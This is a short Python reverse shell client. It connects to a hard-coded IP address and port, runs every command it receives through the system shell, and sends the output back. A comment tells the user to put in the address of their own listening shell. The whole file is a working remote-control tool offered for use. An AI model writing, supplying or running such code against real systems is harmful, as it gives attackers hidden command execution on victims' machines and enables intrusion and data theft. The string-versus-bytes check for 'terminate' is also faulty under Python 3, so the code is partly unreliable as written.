import socket
import subprocess

def connect():
  s = socket.socket()
  s.connect(('192.168.18.16', 8080)) #change ip and port to your ip and port you set on listening shell
  while True:
    command = s.recv(1024)
    if 'terminate' in command:
      s.close()
      break
    else:
      CMD = subprocess.Popen(command.decode(), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      s.send(CMD.stdout.read())
      s.send(CMD.stderr.read())

def main():
  connect()

main()